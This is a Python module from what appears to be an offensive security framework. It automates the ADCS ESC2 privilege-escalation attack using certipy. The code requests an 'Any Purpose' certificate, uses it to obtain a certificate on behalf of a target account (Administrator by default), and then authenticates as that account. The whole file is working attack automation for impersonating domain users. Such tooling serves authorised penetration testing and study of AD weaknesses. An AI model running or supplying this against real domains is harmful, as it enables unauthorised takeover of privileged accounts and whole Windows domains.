import os

from module import BaseModule
from tool import Tool

class ADCSESC2(BaseModule):
    name = "ADCS - ESC2"
    path = "adcs/esc2"
    description = "ESC2: Misconfigured Certificate Template - Any Purpose EKU"
    info = """A certificate template has the Any Purpose EKU or is subverted via the SubCA EKU. A certificate from this template can be used for any purpose, including client authentication, server authentication, and code signing.

Prerequisites:
  - Enrollment Rights: The attacker has enrollment rights on a vulnerable template.
  - Template Config: The template has the Any Purpose EKU OR the SubCA EKU (which allows the holder to issue certificates with any EKU)."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "template": {"default": "", "description": "ESC2 vulnerable template", "required": True},
        "target_account": {"default": "Administrator", "description": "Account to attempt to compromise", "required": True},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        attacker_pfx = self.uniq_filename(self.opts.username)
        pfx = self.uniq_filename(self.opts.target_account)
    
        tool.title("Request the \"Any Purpose\" certificate for the attacker")
        if not await tool.certipy_req(['-template', self.opts.template, '-out', attacker_pfx]):
            return

        tool.title("Request a certificate on behalf of the target user using the \"Any Purpose\" certificate")
        if not await tool.certipy_req(['-template', 'User', '-on-behalf-of', self.opts.target_account, '-pfx', attacker_pfx, '-out', pfx]):
            return

        tool.title("Authenticate as the target user with the obtained certificate")
        if not await tool.certipy_auth(pfx, ['-no-save']):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
